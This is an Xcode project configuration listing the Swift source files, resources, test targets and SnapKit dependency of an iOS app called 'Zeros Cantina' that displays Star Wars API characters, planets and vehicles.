// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 63;
	objects = {

/* Begin PBXBuildFile section */
		FC029C032E16127C0051663F /* CardType.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029B7B2E16127C0051663F /* CardType.swift */; };
		FC029C042E16127C0051663F /* NotificationsConstants.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029B7C2E16127C0051663F /* NotificationsConstants.swift */; };
		FC029C052E16127C0051663F /* DIContainerProtocol.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029B7E2E16127C0051663F /* DIContainerProtocol.swift */; };
		FC029C062E16127C0051663F /* MainRouterProtocol.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029B7F2E16127C0051663F /* MainRouterProtocol.swift */; };
		FC029C072E16127C0051663F /* ModulesFactoryProtocol.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029B802E16127C0051663F /* ModulesFactoryProtocol.swift */; };
		FC029C082E16127C0051663F /* RouterProtocol.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029B812E16127C0051663F /* RouterProtocol.swift */; };
		FC029C092E16127C0051663F /* ModulesFactoryImpl.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029B832E16127C0051663F /* ModulesFactoryImpl.swift */; };
		FC029C0A2E16127C0051663F /* DIContainer.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029B862E16127C0051663F /* DIContainer.swift */; };
		FC029C0B2E16127C0051663F /* UIApplication + Extensions.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029B882E16127C0051663F /* UIApplication + Extensions.swift */; };
		FC029C0C2E16127C0051663F /* Array.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029B8A2E16127C0051663F /* Array.swift */; };
		FC029C0D2E16127C0051663F /* Faking.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029B8C2E16127C0051663F /* Faking.swift */; };
		FC029C0E2E16127C0051663F /* AlertBuilder.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029B8E2E16127C0051663F /* AlertBuilder.swift */; };
		FC029C0F2E16127C0051663F /* MenuItem.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029B912E16127C0051663F /* MenuItem.swift */; };
		FC029C102E16127C0051663F /* AppMenuAction.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029B932E16127C0051663F /* AppMenuAction.swift */; };
		FC029C112E16127C0051663F /* AppReducer.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029B952E16127C0051663F /* AppReducer.swift */; };
		FC029C122E16127C0051663F /* CommonReducer.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029B962E16127C0051663F /* CommonReducer.swift */; };
		FC029C132E16127C0051663F /* ItemsReducer.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029B972E16127C0051663F /* ItemsReducer.swift */; };
		FC029C142E16127C0051663F /* Reducer.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029B982E16127C0051663F /* Reducer.swift */; };
		FC029C152E16127C0051663F /* State.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029B9A2E16127C0051663F /* State.swift */; };
		FC029C162E16127C0051663F /* MenuScreenStore.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029B9B2E16127C0051663F /* MenuScreenStore.swift */; };
		FC029C172E16127C0051663F /* HomeView.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029B9E2E16127C0051663F /* HomeView.swift */; };
		FC029C182E16127C0051663F /* MenuItemsListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029B9F2E16127C0051663F /* MenuItemsListView.swift */; };
		FC029C192E16127C0051663F /* CardItemCollectionViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029BA92E16127C0051663F /* CardItemCollectionViewCell.swift */; };
		FC029C1A2E16127C0051663F /* CustomTabBarButtonModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029BAB2E16127C0051663F /* CustomTabBarButtonModel.swift */; };
		FC029C1B2E16127C0051663F /* CustomTabBarConfiguration.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029BAC2E16127C0051663F /* CustomTabBarConfiguration.swift */; };
		FC029C1C2E16127C0051663F /* CustomTabBar.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029BAE2E16127C0051663F /* CustomTabBar.swift */; };
		FC029C1D2E16127C0051663F /* CustomTabBarButton.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029BAF2E16127C0051663F /* CustomTabBarButton.swift */; };
		FC029C1E2E16127C0051663F /* VCWithCustomTabBar.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029BB12E16127C0051663F /* VCWithCustomTabBar.swift */; };
		FC029C1F2E16127C0051663F /* CoreDataManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029BB42E16127C0051663F /* CoreDataManager.swift */; };
		FC029C202E16127C0051663F /* LocalJSONCharactersFetcher.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029BB62E16127C0051663F /* LocalJSONCharactersFetcher.swift */; };
		FC029C212E16127C0051663F /* LocalJSONDataManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029BB72E16127C0051663F /* LocalJSONDataManager.swift */; };
		FC029C222E16127C0051663F /* LocalJSONPlanetsFetcher.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029BB82E16127C0051663F /* LocalJSONPlanetsFetcher.swift */; };
		FC029C232E16127C0051663F /* SWAPICharactersContainerModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029BBA2E16127C0051663F /* SWAPICharactersContainerModel.swift */; };
		FC029C242E16127C0051663F /* SWAPIPlanetsContainerModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029BBB2E16127C0051663F /* SWAPIPlanetsContainerModel.swift */; };
		FC029C252E16127C0051663F /* SWAPIVehiclesContainerModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029BBC2E16127C0051663F /* SWAPIVehiclesContainerModel.swift */; };
		FC029C262E16127C0051663F /* NetworkSWAPIDataManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029BBE2E16127C0051663F /* NetworkSWAPIDataManager.swift */; };
		FC029C272E16127C0051663F /* SWAPICharactersFetcher.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029BBF2E16127C0051663F /* SWAPICharactersFetcher.swift */; };
		FC029C282E16127C0051663F /* SWAPIPlanetsFetcher.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029BC02E16127C0051663F /* SWAPIPlanetsFetcher.swift */; };
		FC029C292E16127C0051663F /* SWAPIVehiclesFetcher.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029BC12E16127C0051663F /* SWAPIVehiclesFetcher.swift */; };
		FC029C2A2E16127C0051663F /* DataRepositoryWorkerProtocol.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029BC62E16127C0051663F /* DataRepositoryWorkerProtocol.swift */; };
		FC029C2B2E16127C0051663F /* MainDataRepositoryProtocol.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029BC72E16127C0051663F /* MainDataRepositoryProtocol.swift */; };
		FC029C2C2E16127C0051663F /* MainDataRepositoryImpl.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029BC92E16127C0051663F /* MainDataRepositoryImpl.swift */; };
		FC029C2D2E16127C0051663F /* MainModuleProxyImpl.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029BCB2E16127C0051663F /* MainModuleProxyImpl.swift */; };
		FC029C2E2E16127C0051663F /* CardItemProtocol.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029BCF2E16127C0051663F /* CardItemProtocol.swift */; };
		FC029C2F2E16127C0051663F /* CharacterCardModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029BD12E16127C0051663F /* CharacterCardModel.swift */; };
		FC029C302E16127C0051663F /* PlanetCardModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029BD22E16127C0051663F /* PlanetCardModel.swift */; };
		FC029C312E16127C0051663F /* VehiclesCardModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029BD32E16127C0051663F /* VehiclesCardModel.swift */; };
		FC029C322E16127C0051663F /* MainModuleDataOutputProtocol.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029BD52E16127C0051663F /* MainModuleDataOutputProtocol.swift */; };
		FC029C332E16127C0051663F /* MainContract.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029BD72E16127C0051663F /* MainContract.swift */; };
		FC029C342E16127C0051663F /* MainEntity.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029BD82E16127C0051663F /* MainEntity.swift */; };
		FC029C352E16127C0051663F /* MainInteractor.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029BD92E16127C0051663F /* MainInteractor.swift */; };
		FC029C362E16127C0051663F /* MainPresenter.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029BDA2E16127C0051663F /* MainPresenter.swift */; };
		FC029C372E16127C0051663F /* MainRouter.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029BDB2E16127C0051663F /* MainRouter.swift */; };
		FC029C382E16127C0051663F /* CharactersModuleDataInputProtocol.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029BDD2E16127C0051663F /* CharactersModuleDataInputProtocol.swift */; };
		FC029C392E16127C0051663F /* CharactersScreenContract.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029BE02E16127C0051663F /* CharactersScreenContract.swift */; };
		FC029C3A2E16127C0051663F /* CharactersScreenInteractor.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029BE12E16127C0051663F /* CharactersScreenInteractor.swift */; };
		FC029C3B2E16127C0051663F /* CharactersScreenPresenter.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029BE22E16127C0051663F /* CharactersScreenPresenter.swift */; };
		FC029C3C2E16127C0051663F /* CharactersScreenRouter.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029BE32E16127C0051663F /* CharactersScreenRouter.swift */; };
		FC029C3D2E16127C0051663F /* CharactersScreenViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029BE42E16127C0051663F /* CharactersScreenViewController.swift */; };
		FC029C3E2E16127C0051663F /* PlanetsModuleDataInputProtocol.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029BE62E16127C0051663F /* PlanetsModuleDataInputProtocol.swift */; };
		FC029C3F2E16127C0051663F /* PlanetsScreenContract.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029BE92E16127C0051663F /* PlanetsScreenContract.swift */; };
		FC029C402E16127C0051663F /* PlanetsScreenInteractor.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029BEA2E16127C0051663F /* PlanetsScreenInteractor.swift */; };
		FC029C412E16127C0051663F /* PlanetsScreenPresenter.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029BEB2E16127C0051663F /* PlanetsScreenPresenter.swift */; };
		FC029C422E16127C0051663F /* PlanetsScreenRouter.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029BEC2E16127C0051663F /* PlanetsScreenRouter.swift */; };
		FC029C432E16127C0051663F /* PlanetsScreenViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029BED2E16127C0051663F /* PlanetsScreenViewController.swift */; };
		FC029C442E16127C0051663F /* VehiclesModuleDataInputProtocol.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029BEF2E16127C0051663F /* VehiclesModuleDataInputProtocol.swift */; };
		FC029C452E16127C0051663F /* VehiclesScreenContract.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029BF22E16127C0051663F /* VehiclesScreenContract.swift */; };
		FC029C462E16127C0051663F /* VehiclesScreenInteractor.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029BF32E16127C0051663F /* VehiclesScreenInteractor.swift */; };
		FC029C472E16127C0051663F /* VehiclesScreenPresenter.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029BF42E16127C0051663F /* VehiclesScreenPresenter.swift */; };
		FC029C482E16127C0051663F /* VehiclesScreenRouter.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029BF52E16127C0051663F /* VehiclesScreenRouter.swift */; };
		FC029C492E16127C0051663F /* VehiclesScreenViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029BF62E16127C0051663F /* VehiclesScreenViewController.swift */; };
		FC029C4A2E16127C0051663F /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029BFA2E16127C0051663F /* AppDelegate.swift */; };
		FC029C4B2E16127C0051663F /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029BFF2E16127C0051663F /* SceneDelegate.swift */; };
		FC029C4C2E16127C0051663F /* Zeros_Cantina.xcdatamodeld in Sources */ = {isa = PBXBuildFile; fileRef = FC029C002E16127C0051663F /* Zeros_Cantina.xcdatamodeld */; };
		FC029C4D2E16127C0051663F /* characters.json in Resources */ = {isa = PBXBuildFile; fileRef = FC029BA32E16127C0051663F /* characters.json */; };
		FC029C4E2E16127C0051663F /* planets.json in Resources */ = {isa = PBXBuildFile; fileRef = FC029BA42E16127C0051663F /* planets.json */; };
		FC029C4F2E16127C0051663F /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = FC029BA62E16127C0051663F /* Assets.xcassets */; };
		FC029C512E16127C0051663F /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = FC029BFC2E16127C0051663F /* LaunchScreen.storyboard */; };
		FC029C522E16127C0051663F /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = FC029BFE2E16127C0051663F /* Main.storyboard */; };
		FC029C552E16127E0051663F /* Zeros_CantinaTests.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029C532E16127E0051663F /* Zeros_CantinaTests.swift */; };
		FC029C592E1612810051663F /* Zeros_CantinaUITests.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029C562E1612810051663F /* Zeros_CantinaUITests.swift */; };
		FC029C5A2E1612810051663F /* Zeros_CantinaUITestsLaunchTests.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029C572E1612810051663F /* Zeros_CantinaUITestsLaunchTests.swift */; };
		FC029C5C2E1631660051663F /* MenuScreenRouter.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029C5B2E1631660051663F /* MenuScreenRouter.swift */; };
		FC7A74D82DFD075B000F07D3 /* SnapKit in Frameworks */ = {isa = PBXBuildFile; productRef = FC7A74D72DFD075B000F07D3 /* SnapKit */; };
/* End PBXBuildFile section */

/* Begin PBXContainerItemProxy section */
		FC2134872DFCE8EF000B71D6 /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = FC2134652DFCE8ED000B71D6 /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = FC21346C2DFCE8ED000B71D6;
			remoteInfo = "Zeros Cantina";
		};
		FC2134912DFCE8EF000B71D6 /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = FC2134652DFCE8ED000B71D6 /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = FC21346C2DFCE8ED000B71D6;
			remoteInfo = "Zeros Cantina";
		};
/* End PBXContainerItemProxy section */

/* Begin PBXFileReference section */
		FC029B7B2E16127C0051663F /* CardType.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CardType.swift; sourceTree = "<group>"; };
		FC029B7C2E16127C0051663F /* NotificationsConstants.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NotificationsConstants.swift; sourceTree = "<group>"; };
		FC029B7E2E16127C0051663F /* DIContainerProtocol.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DIContainerProtocol.swift; sourceTree = "<group>"; };
		FC029B7F2E16127C0051663F /* MainRouterProtocol.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MainRouterProtocol.swift; sourceTree = "<group>"; };
		FC029B802E16127C0051663F /* ModulesFactoryProtocol.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ModulesFactoryProtocol.swift; sourceTree = "<group>"; };
		FC029B812E16127C0051663F /* RouterProtocol.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RouterProtocol.swift; sourceTree = "<group>"; };
		FC029B832E16127C0051663F /* ModulesFactoryImpl.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ModulesFactoryImpl.swift; sourceTree = "<group>"; };
		FC029B862E16127C0051663F /* DIContainer.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DIContainer.swift; sourceTree = "<group>"; };
		FC029B882E16127C0051663F /* UIApplication + Extensions.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "UIApplication + Extensions.swift"; sourceTree = "<group>"; };
		FC029B8A2E16127C0051663F /* Array.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Array.swift; sourceTree = "<group>"; };
		FC029B8C2E16127C0051663F /* Faking.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Faking.swift; sourceTree = "<group>"; };
		FC029B8E2E16127C0051663F /* AlertBuilder.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AlertBuilder.swift; sourceTree = "<group>"; };
		FC029B912E16127C0051663F /* MenuItem.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MenuItem.swift; sourceTree = "<group>"; };
		FC029B932E16127C0051663F /* AppMenuAction.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppMenuAction.swift; sourceTree = "<group>"; };
		FC029B952E16127C0051663F /* AppReducer.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppReducer.swift; sourceTree = "<group>"; };
		FC029B962E16127C0051663F /* CommonReducer.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CommonReducer.swift; sourceTree = "<group>"; };
		FC029B972E16127C0051663F /* ItemsReducer.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ItemsReducer.swift; sourceTree = "<group>"; };
		FC029B982E16127C0051663F /* Reducer.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Reducer.swift; sourceTree = "<group>"; };
		FC029B9A2E16127C0051663F /* State.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = State.swift; sourceTree = "<group>"; };
		FC029B9B2E16127C0051663F /* MenuScreenStore.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MenuScreenStore.swift; sourceTree = "<group>"; };
		FC029B9E2E16127C0051663F /* HomeView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeView.swift; sourceTree = "<group>"; };
		FC029B9F2E16127C0051663F /* MenuItemsListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MenuItemsListView.swift; sourceTree = "<group>"; };
		FC029BA32E16127C0051663F /* characters.json */ = {isa = PBXFileReference; explicitFileType = text.json; path = characters.json; sourceTree = "<group>"; };
		FC029BA42E16127C0051663F /* planets.json */ = {isa = PBXFileReference; explicitFileType = text.json; path = planets.json; sourceTree = "<group>"; };
		FC029BA62E16127C0051663F /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		FC029BA72E16127C0051663F /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		FC029BA92E16127C0051663F /* CardItemCollectionViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CardItemCollectionViewCell.swift; sourceTree = "<group>"; };
		FC029BAB2E16127C0051663F /* CustomTabBarButtonModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomTabBarButtonModel.swift; sourceTree = "<group>"; };
		FC029BAC2E16127C0051663F /* CustomTabBarConfiguration.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomTabBarConfiguration.swift; sourceTree = "<group>"; };
		FC029BAE2E16127C0051663F /* CustomTabBar.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomTabBar.swift; sourceTree = "<group>"; };
		FC029BAF2E16127C0051663F /* CustomTabBarButton.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomTabBarButton.swift; sourceTree = "<group>"; };
		FC029BB12E16127C0051663F /* VCWithCustomTabBar.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = VCWithCustomTabBar.swift; sourceTree = "<group>"; };
		FC029BB42E16127C0051663F /* CoreDataManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CoreDataManager.swift; sourceTree = "<group>"; };
		FC029BB62E16127C0051663F /* LocalJSONCharactersFetcher.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LocalJSONCharactersFetcher.swift; sourceTree = "<group>"; };
		FC029BB72E16127C0051663F /* LocalJSONDataManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LocalJSONDataManager.swift; sourceTree = "<group>"; };
		FC029BB82E16127C0051663F /* LocalJSONPlanetsFetcher.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LocalJSONPlanetsFetcher.swift; sourceTree = "<group>"; };
		FC029BBA2E16127C0051663F /* SWAPICharactersContainerModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SWAPICharactersContainerModel.swift; sourceTree = "<group>"; };
		FC029BBB2E16127C0051663F /* SWAPIPlanetsContainerModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SWAPIPlanetsContainerModel.swift; sourceTree = "<group>"; };
		FC029BBC2E16127C0051663F /* SWAPIVehiclesContainerModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SWAPIVehiclesContainerModel.swift; sourceTree = "<group>"; };
		FC029BBE2E16127C0051663F /* NetworkSWAPIDataManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NetworkSWAPIDataManager.swift; sourceTree = "<group>"; };
		FC029BBF2E16127C0051663F /* SWAPICharactersFetcher.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SWAPICharactersFetcher.swift; sourceTree = "<group>"; };
		FC029BC02E16127C0051663F /* SWAPIPlanetsFetcher.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SWAPIPlanetsFetcher.swift; sourceTree = "<group>"; };
		FC029BC12E16127C0051663F /* SWAPIVehiclesFetcher.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SWAPIVehiclesFetcher.swift; sourceTree = "<group>"; };
		FC029BC62E16127C0051663F /* DataRepositoryWorkerProtocol.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DataRepositoryWorkerProtocol.swift; sourceTree = "<group>"; };
		FC029BC72E16127C0051663F /* MainDataRepositoryProtocol.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MainDataRepositoryProtocol.swift; sourceTree = "<group>"; };
		FC029BC92E16127C0051663F /* MainDataRepositoryImpl.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MainDataRepositoryImpl.swift; sourceTree = "<group>"; };
		FC029BCB2E16127C0051663F /* MainModuleProxyImpl.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MainModuleProxyImpl.swift; sourceTree = "<group>"; };
		FC029BCF2E16127C0051663F /* CardItemProtocol.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CardItemProtocol.swift; sourceTree = "<group>"; };
		FC029BD12E16127C0051663F /* CharacterCardModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CharacterCardModel.swift; sourceTree = "<group>"; };
		FC029BD22E16127C0051663F /* PlanetCardModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PlanetCardModel.swift; sourceTree = "<group>"; };
		FC029BD32E16127C0051663F /* VehiclesCardModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = VehiclesCardModel.swift; sourceTree = "<group>"; };
		FC029BD52E16127C0051663F /* MainModuleDataOutputProtocol.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MainModuleDataOutputProtocol.swift; sourceTree = "<group>"; };
		FC029BD72E16127C0051663F /* MainContract.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MainContract.swift; sourceTree = "<group>"; };
		FC029BD82E16127C0051663F /* MainEntity.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MainEntity.swift; sourceTree = "<group>"; };
		FC029BD92E16127C0051663F /* MainInteractor.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MainInteractor.swift; sourceTree = "<group>"; };
		FC029BDA2E16127C0051663F /* MainPresenter.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MainPresenter.swift; sourceTree = "<group>"; };
		FC029BDB2E16127C0051663F /* MainRouter.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MainRouter.swift; sourceTree = "<group>"; };
		FC029BDD2E16127C0051663F /* CharactersModuleDataInputProtocol.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CharactersModuleDataInputProtocol.swift; sourceTree = "<group>"; };
		FC029BE02E16127C0051663F /* CharactersScreenContract.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CharactersScreenContract.swift; sourceTree = "<group>"; };
		FC029BE12E16127C0051663F /* CharactersScreenInteractor.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CharactersScreenInteractor.swift; sourceTree = "<group>"; };
		FC029BE22E16127C0051663F /* CharactersScreenPresenter.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CharactersScreenPresenter.swift; sourceTree = "<group>"; };
		FC029BE32E16127C0051663F /* CharactersScreenRouter.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CharactersScreenRouter.swift; sourceTree = "<group>"; };
		FC029BE42E16127C0051663F /* CharactersScreenViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CharactersScreenViewController.swift; sourceTree = "<group>"; };
		FC029BE62E16127C0051663F /* PlanetsModuleDataInputProtocol.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PlanetsModuleDataInputProtocol.swift; sourceTree = "<group>"; };
		FC029BE92E16127C0051663F /* PlanetsScreenContract.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PlanetsScreenContract.swift; sourceTree = "<group>"; };
		FC029BEA2E16127C0051663F /* PlanetsScreenInteractor.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PlanetsScreenInteractor.swift; sourceTree = "<group>"; };
		FC029BEB2E16127C0051663F /* PlanetsScreenPresenter.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PlanetsScreenPresenter.swift; sourceTree = "<group>"; };
		FC029BEC2E16127C0051663F /* PlanetsScreenRouter.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PlanetsScreenRouter.swift; sourceTree = "<group>"; };
		FC029BED2E16127C0051663F /* PlanetsScreenViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PlanetsScreenViewController.swift; sourceTree = "<group>"; };
		FC029BEF2E16127C0051663F /* VehiclesModuleDataInputProtocol.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = VehiclesModuleDataInputProtocol.swift; sourceTree = "<group>"; };
		FC029BF22E16127C0051663F /* VehiclesScreenContract.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = VehiclesScreenContract.swift; sourceTree = "<group>"; };
		FC029BF32E16127C0051663F /* VehiclesScreenInteractor.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = VehiclesScreenInteractor.swift; sourceTree = "<group>"; };
		FC029BF42E16127C0051663F /* VehiclesScreenPresenter.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = VehiclesScreenPresenter.swift; sourceTree = "<group>"; };
		FC029BF52E16127C0051663F /* VehiclesScreenRouter.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = VehiclesScreenRouter.swift; sourceTree = "<group>"; };
		FC029BF62E16127C0051663F /* VehiclesScreenViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = VehiclesScreenViewController.swift; sourceTree = "<group>"; };
		FC029BFA2E16127C0051663F /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
		FC029BFB2E16127C0051663F /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
		FC029BFD2E16127C0051663F /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
		FC029BFF2E16127C0051663F /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
